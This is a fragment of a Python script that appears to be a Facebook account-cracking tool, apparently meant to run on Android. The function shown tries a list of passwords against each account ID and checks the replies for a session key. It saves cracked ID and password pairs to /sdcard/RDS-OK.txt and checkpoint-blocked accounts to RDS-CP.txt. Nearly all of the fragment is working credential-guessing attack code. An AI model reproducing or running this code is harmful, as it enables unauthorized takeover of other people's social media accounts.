...
\033[1;37m--------------------------------------------------
 ...
 [\033[1;32m*\033[1;37m] Version  : 0.10.9
\033[1;37m--------------------------------------------------
 [\033[1;32m*\033[1;37m]\033[1;33mYOUR ACCOUNTs ARE SAVE IN:\033[1;32m/sdcard/RDS-OK.txt\033[1;37m
\033[1;37m--------------------------------------------------""")
def linex():
	print('\033[1;37m--------------------------------------------------')
def clear():
...
def api1(ids,names,passlist):
		try:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [RDS-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/RDS-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [RDS-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/RDS-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/RDS-CP.txt','a').write(ids+'|'+pas+'\n')
